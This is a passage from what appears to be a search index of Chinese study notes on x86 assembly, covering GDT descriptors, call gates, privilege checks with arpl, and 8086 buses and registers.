level\uff09\u8868\u793a\u6bb5\u5730\u5740\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684\u6743\u9650\u3002\u610f\u4e49\u5373\u662f ring?\uff0c\u6570\u5b57\u8d8a\u5c0f\u6743\u9650\u8d8a\u5927 \u6bb5\u63cf\u8ff0\u7b26 \u00b6 gdt\uff08global descriptor table\uff09\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\uff0c\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u5747\u4e3a 8 \u5b57\u8282\u3002 \u7a0b\u5e8f\u4e2d\u7684\u6bb5\u5730\u5740\u5b9e\u9645\u4e0a\u53eb selector\uff0cselector \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e3a gdt+(selector&0FFF8h) \u5904\u7684 8 \u5b57\u8282\uff08\u5373\u4e22\u6389 selector \u7684\u4f4e 3 \u4f4d\uff09 gdt+00h gdt+08h +---+---+-base_addr--+ | | | | -- -- -- -- gdt+10h FF, FF, 00, 80, 0B, F3, 0F, 00 ; \u6574\u4f53 8 \u5b57\u8282\u662f\u6bb5\u5730\u5740 10h \u7684\u63cf\u8ff0\u7b26\uff08descriptor\uff09 ~~ ~~ == ^~ +---+---------------|---|+ | | +-- Granularity = bit 7 | +-- DPL = bit 6, 5 = 11 +-- limit || || 1111 0011 <- 0F |--| | || | | | |+-- Accessed | | | +-- bit 1 | | +-- bit 3 | +-- S +-- Present = bit 7 gdt+18h \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u7b2c 6\u30015 \u4e2a bit \u4e3a DPL \u4f8b\u4e0a\u9762 10h \u6bb5\u7684 DPL \u4e3a 11b \u5373 3\uff08F3 -> 1 11 1 0011\uff09 \u7b2c 2\u30013\u30014\u30017 \u4e2a\u5b57\u8282\u4e3a\u6bb5\u8d77\u59cb\u5730\u5740 base_addr\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6bb5\u8d77\u59cb\u5730\u5740\u4e3a 000B8000h \u7b2c 0\u30011 \u4e2a\u5b57\u8282\u548c\u7b2c 6 \u4e2a\u5b57\u8282\u7684\u540e\u534a\u4e2a\u5b57\u8282\u4e3a\u6700\u5927\u504f\u79fb\u5730\u5740 limit\uff0c\u5c0f\u7aef\u5e8f \u4f8b\u4e0a\u9762 10h \u6bb5\u7684\u6700\u5927\u504f\u79fb\u5730\u5740\u4e3a 0FFFFFh\uff0c\u6700\u5c0f\u504f\u79fb\u5730\u5740\u4e3a 0\uff0c\u6240\u4ee5\u6bb5\u957f\u5ea6\u4e3a 100000h \u5373 1M \u7b2c 6 \u4e2a\u5b57\u8282\u7684\u7b2c 7 \u4e2a bit \u4e3a\u7c92\u5ea6 Granularity\uff0c\u5f53\u8be5\u4f4d\u4e3a 1 \u65f6\uff0climit \u7684\u5355\u4f4d\u53d8\u6210 page\uff08\u9875\uff0c\u4e00\u9875\u4e3a 4k=1000h \u5b57\u8282\uff09 \u4f8b\u5982\u5982\u679c limit \u4e3a FFFFF\uff0cG \u4e3a 1\uff0c\u5219\u6700\u5927\u504f\u79fb\u5730\u5740\u53d8\u4e3a FFFFFFFF\uff08\u6700\u540e\u4e00\u9875\u7684\u5730\u5740\u4e3a [FFFFF000, FFFFFFFF]\uff09 \u7b2c 5 \u4e2a\u5b57\u8282\u7684\u5176\u5b83 bit \u7b2c 7 bit \u4e3a Present\uff0c\u8868\u793a\u8be5\u6bb5\u662f\u5426\u5b58\u5728 \u7b2c 4 bit \u4e3a S\uff0cS = 1 \u8868\u793a\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\uff0c0 \u5219\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26\uff08\u5305\u62ec\u4e0b\u9762\u7684 call gate\uff09 \u7b2c 3 bit \u4e3a 0 \u8868\u793a\u662f\u6570\u636e\u6bb5\uff0c1 \u8868\u793a\u662f\u4ee3\u7801\u6bb5 \u7b2c 1 bit\uff0c\u5982\u679c\u662f\u6570\u636e\u6bb5\uff0c\u5219 1 \u8868\u793a\u53ef\u5199\uff0c\u4ee3\u7801\u6bb5\u65f6 1 \u8868\u793a\u53ef\u8bfb \u7b2c 0 bit \u4e3a Accessed \u8868\u793a\u63cf\u8ff0\u7b26\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7 \u6bb5\u5730\u5740\uff08\u5176\u5b9e\u53eb selector\uff0910h \u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u7684 DPL \u4e3a 11\uff0c\u5373\u6743\u9650\u4e3a ring3\uff08DPL \u4e3a 3\uff08\u6700\u4f4e\uff09\u7684\u65f6\u5019\u6240\u6709\u7a0b\u5e8f\u90fd\u662f\u6709\u6743\u8bbf\u95ee\u7684\uff09 \u5047\u8bbe\u524d\u9762\u90a3\u6bb5\u4ee3\u7801\u4e2d\u8d4b\u503c\u7ed9 ax \u7684\u6bb5\u5730\u5740\u4e3a 10h\uff0ccs \u4e3a 08h\uff080000 10 00 \uff09\uff0c\u5219 cs.cpl = 00\uff0c\u4e8e\u662f cs.cpl < 10h->descriptor.DPL\uff0c\u56e0\u6b64\u5f53\u524d\u7a0b\u5e8f\u6709\u6743\u628a ds \u8d4b\u503c\u4e3a 10h\uff0c\u5373\u6709\u6743\u8bbf\u95ee\u8be5\u6bb5\u4e2d\u7684\u6570\u636e \u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u5c0f\u4e8e\u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL\u3002\u82e5\u6bb5\u63cf\u8ff0\u7b26\u63cf\u8ff0\u7684\u662f\u4e00\u4e2a\u4ee3\u7801\u6bb5\uff0c\u5219\u8bbf\u95ee\u8005\u7684 CPL \u5fc5\u987b \u7b49\u4e8e \u8be5\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u624d\u80fd jmp\u3001call \u5230\u8be5\u6bb5\u91cc\u9762\u7684\u51fd\u6570 \u5f53\u8bbf\u95ee\u8005\u7684 CPL \u5927\u4e8e\u67d0\u4e2a\u4ee3\u7801\u6bb5\u63cf\u8ff0\u7b26\u7684 DPL \u65f6\uff0c\u5219\u53ea\u80fd\u7528 call call_gate_selector:0 \u8fd9\u6837\u7684\u65b9\u5f0f\u95f4\u63a5\u8c03\u7528\u8be5\u4ee3\u7801\u6bb5\u4e2d\u7684\u51fd\u6570 call gate \u00b6 call gate \u5373\u8c03\u7528\u95e8\uff0c\u53ef\u4ee5\u770b\u4f5c\u4f4e\u6743\u9650\u8c03\u7528\u9ad8\u6743\u9650\u51fd\u6570\u7684\u8df3\u677f\u3002\u5b83\u672c\u8eab\u9700\u8981\u7528 8 \u4e2a\u5b57\u8282\u6765\u63cf\u8ff0\uff0c\u683c\u5f0f\u4f8b\u5982\uff1a +---+--------------------+---+-- \u76ee\u6807\u51fd\u6570\u504f\u79fb\u5730\u5740 | | | | -- -- -- -- gdt+20h 78, 56, 08, 00, 02, EC, 34, 12 == == ^^ ~~ | | | | +-------|----|--|---+---- \u5c5e\u6027 | | | +---- \u53c2\u6570\u7684\u4e2a\u6570 | +----+---- \u76ee\u6807\u51fd\u6570\u7684\u6bb5\u5730\u5740\uff08selector\uff09 | EC = 1110 1100 |==^ ---- || | | || | +-- type\uff0c0C \u5373\u8868\u793a\u662f 32 \u4f4d\u8c03\u7528\u95e8 || +-- S = 0\uff0c\u662f\u7cfb\u7edf\u63cf\u8ff0\u7b26 |+-- DPL +-- Present \u5f53 gdt \u91cc\u7684 S = 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f\u4e00\u4e2a\u7cfb\u7edf\u63cf\u8ff0\u7b26\u800c\u4e0d\u662f\u6570\u636e\u6bb5\u6216\u4ee3\u7801\u6bb5\u7684\u63cf\u8ff0\u7b26\u3002\u7cfb\u7edf\u63cf\u8ff0\u7b26\u6709 tss\uff08task state segment\uff09\u63cf\u8ff0\u7b26\u3001task gate \u63cf\u8ff0\u7b26\u3001interrupt gate \u63cf\u8ff0\u7b26\u3001trap gate \u63cf\u8ff0\u7b26\u7b49\uff0cS = 0 \u4e14 type = 1100b \u65f6\u5373\u8868\u793a\u5f53\u524d\u63cf\u8ff0\u7b26\u662f 32 \u4f4d\u7684\u8c03\u7528\u95e8 \u5c5e\u6027\u4e2d\u7684 DPL \u662f call gate \u81ea\u5df1\u7684\u6743\u9650\u800c\u4e0d\u662f\u76ee\u6807\u51fd\u6570\u7684\u6743\u9650\uff0c\u76ee\u6807\u51fd\u6570\u7684 DPL \u8981\u901a\u8fc7\u7b2c 2\u30013 \u5b57\u8282\u7684 selector \u627e\u5230\u5bf9\u5e94\u63cf\u8ff0\u7b26\u7684 DPL \u8c03\u7528 call gate \u65f6\u7684\u6743\u9650\u6bd4\u8f83\uff1a \u8c03\u7528\u8005\u7684 CPL <= call_gate_selector->descripter.DPL \u8c03\u7528\u8005\u7684 CPL >= call_gate_selector->descriptor.target_selector->descriptor.DPL CPU \u4ece ROM \u542f\u52a8\u540e\u8fdb\u5165\u5b9e\u6a21\u5f0f\uff0c\u800c\u5b9e\u6a21\u5f0f\u7684\u6743\u9650\u90fd\u662f ring0\uff0c\u53ef\u4ee5\u5728\u5b9e\u6a21\u5f0f\u4e2d\u6267\u884c retf \u6765\u964d\u7ea7\u5230 ring3\u3002\u6784\u9020 jmp far ptr tss_selector:0 \u53ef\u4ee5\u4ece ring0 \u5f3a\u884c\u8df3\u56de ring3\uff08\u9700\u8981\u6784\u9020 tss \u4e0e\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\uff09 \u4ee5 memset(p, 0, n) \u4e3a\u4f8b\uff0cring0 \u51fd\u6570\u5982\u4f55\u9632\u6b62 ring3 \u4f20\u9012\u4e00\u4e2a\u6076\u610f\u7684\u6307\u9488\u5982 ring0 \u6307\u9488 p\u3002ring3 \u8fdb\u7a0b\u5047\u5982\u4e0d\u8c03\u7528 memset()\uff0c\u800c\u662f\u81ea\u5df1\u505a *p = ... \u7684\u5199\u5165\u4e00\u5b9a\u4f1a\u89e6\u53d1 GPF(General Protect Fault) \u5373\u5728\u8be5\u6307\u4ee4\u524d\u63d2\u5165\u5e76\u8c03\u7528 int 0Dh \u5047\u8bbe\u5728 ring3 \u4e2d\u8c03\u7528 memset(p, 0, 1) p = 0x2800000000\uff08\u5047\u8bbe 0x28 \u8fd9\u4e2a selector \u5bf9\u5e94\u6bb5\u7684 DPL \u662f 0\uff09 push 1 push 0 push 28 h push 0 call far ptr call_gate_to_memset : 0 \u5f53\u8fd9\u6761 call \u53d1\u751f\u65f6\uff0cring3 \u7684\u5806\u6808\u4e2d\u4ec5\u6709 call \u6307\u4ee4\u4e0a\u65b9 push \u7684\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u4e0b\u6761\u6307\u4ee4\u7684\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u3002CPU \u4f1a\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684 tss\uff08task state segment\uff0c\u901a\u8fc7 ltr \u6307\u4ee4\u8d4b\u503c\uff09\u4e2d\u53d6\u51fa ss0 \u53ca esp0 \u4f5c\u4e3a\u65b0\u7684\u5806\u6808\u6307\u9488\uff08ss = ss0, esp = esp0\uff09\uff0c\u8fdb\u884c\u5806\u6808\u5207\u6362\u3002\u4e4b\u540e\u8fdb\u884c\u7684\u64cd\u4f5c\u6709\uff1a push ring3 \u7684 ss\u3001push ring3 \u7684 esp \u628a ring3 \u4e2d\u7684\u53c2\u6570\u5168\u90e8\u590d\u5236\u5230 ring0 \u5806\u6808\u4e2d push ring3 \u7684 cs\u3001push ring3 \u7684 eip jmp \u76ee\u6807\u51fd\u6570 memset \u51fd\u6570\u4e2d\u4f1a\u53d6\u51fa\u8c03\u7528\u8005\u7684 cs\uff0c\u53d6\u51fa CPL \u4e0e\u53c2\u6570 p \u6bb5\u5730\u5740\u7684 DPL \u8fdb\u884c\u6bd4\u8f83 memset: push ebp mov ebp , esp mov cx , [ ebp + 8 ] ; \u8c03\u7528\u8005 ring3 \u7684 cs mov ax , [ ebp + 10 h ] ; 28h arpl ax , cx ; adjust request privilege level ; \u4f1a\u628a cx \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 ax \u7684\u4f4e 2 \u4f4d\uff0c\u5373 ax \u53d8\u4e3a 2Bh mov ds , ax ; \u8fd9\u91cc\u4f1a\u89e6\u53d1 GPF ; CPU \u8fdb\u884c\u6743\u9650\u68c0\u67e5\uff0c\u5f53 cs.cpl <= 28h \u6bb5\u7684 DPL ; && ax.rpl <= 28h \u6bb5\u7684 DPL \u65f6\u624d\u80fd\u8d4b\u503c\u6210\u529f\uff08ax.rpl \u5373 ax \u7684\u4f4e 2 \u4f4d\uff09 arpl \u4fdd\u62a4\u6a21\u5f0f \u6307\u4ee4\u683c\u5f0f \uff1aarpl dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08adjust request privilege level\uff09\u5f53 src \u7684\u4f4e 2 \u4f4d\u5927\u4e8e dest \u7684\u4f4e 2 \u4f4d\u65f6\uff0c\u4f1a\u628a src \u7684\u4f4e 2 \u4f4d\u590d\u5236\u7ed9 dest \u7684\u4f4e 2 \u4f4d \u6ce8\u610f \uff1adest \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0csrc \u4e3a\u5bc4\u5b58\u5668","title":"x86 \u6c47\u7f16\u8bed\u8a00"},{"location":"cs/pl/asm/#x86","text":"Abstract \u81ea\u5b66\uff0c\u770b\u4e66\u300a\u6c47\u7f16\u8bed\u8a00\uff08\u7b2c4\u7248\uff09\u300b\u738b\u723d \u6d59\u6c5f\u5927\u5b66\u767d\u6d2a\u6b22\u8001\u5e08 \u201c\u6c47\u7f16\u8bed\u8a00\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b https://faydoc.tripod.com/cpu/index.htm","title":"x86 \u6c47\u7f16\u8bed\u8a00"},{"location":"cs/pl/asm/#_1","text":"\u4e00\u4e9b\u4ec5\u4f9b\u4e86\u89e3\u7684\u4e1c\u897f \u673a\u5668\u8bed\u8a00\uff1a\u673a\u5668\u6307\u4ee4\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u7684\u96c6\u5408 CPU \u53ef\u4ee5\u6267\u884c\u673a\u5668\u6307\u4ee4\uff0c\u8fdb\u884c\u8fd0\u7b97 \u6c47\u7f16\u8bed\u8a00\u4e3b\u4f53\u662f\u6c47\u7f16\u6307\u4ee4\uff0c\u6c47\u7f16\u6307\u4ee4\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7ed9\u8ba1\u7b97\u673a\u6267\u884c \u5bc4\u5b58\u5668\uff1aCPU \u4e2d\u53ef\u4ee5\u5b58\u50a8\u6570\u636e\u7684\u5668\u4ef6 \u6c47\u7f16\u8bed\u8a00\u7ec4\u6210\uff1a \u6c47\u7f16\u6307\u4ee4\uff1a\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff0c\u662f\u673a\u5668\u7801\u7684\u52a9\u8bb0\u7b26 \u4f2a\u6307\u4ee4\uff1a\u7531\u7f16\u8bd1\u5668\u6267\u884c\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u5176\u4ed6\u7b26\u53f7\uff08+-*/\u7b49\uff09\uff1a\u7531\u7f16\u8bd1\u5668\u8bc6\u522b\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u5b58\u653e\uff0c\u88ab CPU \u4f7f\u7528 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e8c\u8fdb\u5236\u4fe1\u606f \u8ba1\u7b97\u673a\u6700\u5c0f\u4fe1\u606f\u5355\u4f4d\u662f bit\uff0c8 \u4e2a bit \u7ec4\u6210\u4e00\u4e2a Byte\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e2a Byte\uff088 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff09\uff0c\u5b58\u50a8\u5355\u5143\u4ece 0 \u5f00\u59cb\u7f16\u53f7 CPU \u901a\u8fc7\u603b\u7ebf\u4e0e\u5b58\u50a8\u5668\u82af\u7247\u4f20\u8f93\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u606f\uff08\u603b\u7ebf\uff1a\u8fde\u63a5 CPU \u548c\u5176\u4ed6\u82af\u7247\u7684\u4e00\u5806\u5bfc\u7ebf\uff09 CPU \u4ece\u5185\u5b58\u8bfb\u53d6\u6570\u636e\u7684\u8fc7\u7a0b\uff1a CPU \u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f\u53d1\u51fa CPU \u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u544a\u77e5\u6307\u5b9a\u5b58\u50a8\u5668\u82af\u7247\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e \u5b58\u50a8\u5668\u5c06\u6240\u9700\u5730\u5740\u5904\u7684\u6570\u636e\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u7ed9 CPU CPU \u901a\u8fc7 \u5730\u5740\u603b\u7ebf \u6307\u5b9a\u5b58\u50a8\u5355\u5143\u3002\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU \u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740 \u4e00\u4e2a CPU \u6709 n \u6839\u5730\u5740\u7ebf\uff0c\u5219\u8fd9\u4e2a CPU \u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a n\uff0c\u8fd9\u6837\u7684 CPU \u6700\u591a\u53ef\u4ee5\u5bfb\u627e 2 n \u4e2a\u5185\u5b58\u5355\u5143 CPU \u901a\u8fc7 \u6570\u636e\u603b\u7ebf \u6765\u4e0e\u5185\u5b58\u6216\u5176\u4ed6\u5668\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u3002\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u4e0e\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6 8 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e00\u4e2a 8 \u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff081 \u4e2a\u5b57\u8282\uff09\uff0c16 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e24\u4e2a\u5b57\u8282 8088 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 8\uff0c8086 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 16 CPU \u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u5bf9\u5916\u90e8\u5668\u4ef6\u8fdb\u884c\u63a7\u5236\u3002\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b \u4e3b\u677f\u4e0a\u5668\u4ef6\u901a\u8fc7\u603b\u7ebf\u548c CPU \u76f8\u8fde CPU \u901a\u8fc7\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684\u63a5\u53e3\u5361\u95f4\u63a5\u63a7\u5236\u5916\u8bbe \u5b58\u50a8\u5668\u82af\u7247\u4ece\u8bfb\u5199\u4e0a\u5206\u4e3a \u968f\u673a\u5b58\u50a8\u5668\uff08RAM\uff09\u548c \u53ea\u8bfb\u5b58\u50a8\u5668\uff08ROM\uff09 RAM \u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u5fc5\u987b\u5e26\u7535\u5b58\u50a8\uff0c\u5173\u673a\u540e\u5185\u5bb9\u4e22\u5931 ROM \u53ea\u8bfb\u4e0d\u5199\uff0c\u4f46\u5173\u673a\u540e\u5185\u5bb9\u4e0d\u4e22\u5931 \u5b58\u50a8\u5668\u4ece\u529f\u80fd\u548c\u8fde\u63a5\u4e0a\u5206\u4e3a\uff1a \u968f\u673a\u5b58\u50a8\u5668\uff1a\u5b58\u653e\u4f9b CPU \u4f7f\u7528\u7684\u7edd\u5927\u90e8\u5206\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u7531\u88c5\u5728\u4e3b\u677f\u4e0a\u7684 RAM \u548c\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684 RAM \u7ec4\u6210 \u88c5\u6709 BIOS \u7684 ROM\uff1a\u5382\u5546\u63d0\u4f9b\u7684\u8f6f\u4ef6\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b83\u5229\u7528\u8be5\u786c\u4ef6\u8bbe\u5907\u8fdb\u884c\u6700\u57fa\u672c\u7684\u8f93\u5165\u8f93\u51fa \u63a5\u53e3\u5361\u4e0a\u7684 RAM\uff1a\u67d0\u4e9b\u63a5\u53e3\u5361\u9700\u8981\u5bf9\u5927\u6279\u91cf\u8f93\u5165\u3001\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u6682\u65f6\u5b58\u50a8\uff0c\u5728\u5176\u4e0a\u88c5\u6709 RAM\uff08\u5982\u663e\u5b58\uff09 CPU \u5728\u64cd\u63a7\u5b58\u50a8\u5668\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u5373\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a\u7269\u7406\u5b58\u50a8\u5668\u5728\u5176\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u5730\u5740\u7a7a\u95f4","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"cs/pl/asm/#_2","text":"\u4e8c\u8fdb\u5236\u6570\u672b\u5c3e\u7528 B/b \u4f5c\u540e\u7f00\uff0c\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u7528 H/h \u4f5c\u540e\u7f00\u4e14\u5982\u679c\u5f00\u5934\u4e3a\u5b57\u6bcd\u5219\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a 0\uff0c\u516b\u8fdb\u5236\u672b\u5c3e\u7528 Q/q \u4f5c\u540e\u7f00\uff0c\u5341\u8fdb\u5236\u4e0d\u7528\u540e\u7f00 \u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53eb\u4e00\u4f4d\uff08bit\uff09\uff0c\u56db\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u534a\u5b57\u8282\uff08nibble\uff09\uff0c\u516b\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\u8282\uff08byte\uff09\uff0c\u5341\u516d\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\uff08word\uff09\uff0c\u4e09\u5341\u4e8c\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u53cc\u5b57\uff08double word\uff09 \u5b57\u7b26\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5355\u5f15\u53f7\u62ec\u5b57\u7b26\u6765\u8868\u793a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94 ASCII \u7801\u6765\u8868\u793a","title":"\u6570\u636e\u7684\u8868\u793a\u4e0e\u7ec4\u7ec7"},{"location":"cs/pl/asm/#_3","text":"8086 \u5185\u90e8\u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff0c8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c4 \u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c2 \u4e2a\u63a7\u5236\u5bc4\u5b58\u5668 \u901a\u7528\u5bc4\u5b58\u5668 \u6570\u636e\u5bc4\u5b58\u5668\uff1aax bx cx dx\uff0c\u7528\u4e8e\u5b58\u653e\u6570\u636e\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 16 \u4f4d\uff0c\u53ef\u5206\u4e3a\u9ad8\u4f4e 8 \u4f4d\uff0c\u9ad8 8 \u4f4d\u5206\u522b\u4e3a ah bh ch dh\uff0c\u4f4e\u516b\u4f4d\u5206\u522b\u4e3a al bl cl dl\uff0c\u4e14\u5982\u679c\u53ea\u4fee\u6539\u516b\u4f4d\uff0c\u5219\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u5916\u516b\u4f4d\uff08\u6bd4\u5982\u6ea2\u51fa\u4e0d\u4f1a\u4ece al \u6ea2\u51fa\u5230 ah\uff09 ax\uff1a\u7d2f\u52a0\u5668\uff0c\u5e38\u7528\u4f5c\u7d2f\u52a0\uff0c\u4e14\u5728\u4e58\u9664\u6cd5\u3001\u4e32\u8fd0\u7b97\u3001IO \u4e2d\u6709\u4e13\u95e8\u7528\u5904 bx\uff1a\u57fa\u5740\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u6765\u5b58\u653e\u5bfb\u5740\u7684\u57fa\u5740 cx\uff1a\u8ba1\u6570\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u5728\u5faa\u73af\u4e2d\u4f5c\u4e3a\u8ba1\u6570\u5668 dx\uff1a\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5b58\u653e IO \u7aef\u53e3\u5730\u5740\uff0c\u4e14\u5728\u53cc\u5b57\u8fd0\u7b97\u4e2d\u4f5c\u4e3a ax \u7684\u6269\u5c55\u9ad8\u5341\u516d\u4f4d \u53d8\u5740\u5bc4\u5b58\u5668\uff1asi di\uff0c\u5e38\u7528\u6765\u5bfb\u5740 si\uff1a\u6e90\u53d8\u5740\u5bc4\u5b58\u5668 di\uff1a\u76ee\u7684\u53d8\u5740\u5bc4\u5b58\u5668 \u6307\u9488\u5bc4\u5b58\u5668\uff1asp bp\uff0c\u5e38\u4e0e ss \u6784\u6210\u8fdc\u6307\u9488 sp\uff1a\u5806\u6808\u6307\u9488\u5bc4\u5b58\u5668\uff0css:sp \u6307\u5411\u5806\u6808\u9876\u7aef bp\uff1a\u57fa\u5740\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5e38\u7528 ss:bp \u6307\u5411\u5806\u6808\u4e2d\u6570\u636e \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es cs\uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740 ss\uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740 ds\uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740 es\uff1a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u9644\u52a0\u6570\u636e\u6bb5\u6bb5\u5730\u5740 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aip fl ip\uff1a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u504f\u79fb\u5730\u5740\uff0c cs:ip \u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u9996\u5b57\u8282\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee ip fl\uff1a\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c16 \u4f4d\u4f46\u53ea\u4f7f\u7528 9 \u4f4d\u8868\u793a 6 \u4e2a\u72b6\u6001\u6807\u5fd7\u548c 3 \u4e2a\u63a7\u5236\u6807\u5fd7\uff08df if tf\uff09 of\uff1aoverflow flag \u6ea2\u51fa\u6807\u5fd7\uff0c\u7b2c 11 \u4f4d\uff0c\u8868\u793a\u8fd0\u7b97\u662f\u5426\u6ea2\u51fa df\uff1adirection flag \u65b9\u5411\u6807\u5fd7\uff0c\u7b2c 10 \u4f4d\uff0c\u6807\u5fd7\u5b57\u7b26\u4e32\u5904\u7406\u6307\u4ee4\u4e2d\u5904\u7406\u4fe1\u606f\u7684\u65b9\u5411 if\uff1ainterrupt flag \u4e2d\u65ad\u6807\u5fd7\uff0c\u7b2c 9 \u4f4d\uff0c\u662f\u5426\u5141\u8bb8\u5916\u90e8\u786c\u4ef6\u4e2d\u65ad tf\uff1atrace flag \u8ddf\u8e2a\u6807\u5fd7\uff0c\u7b2c 8 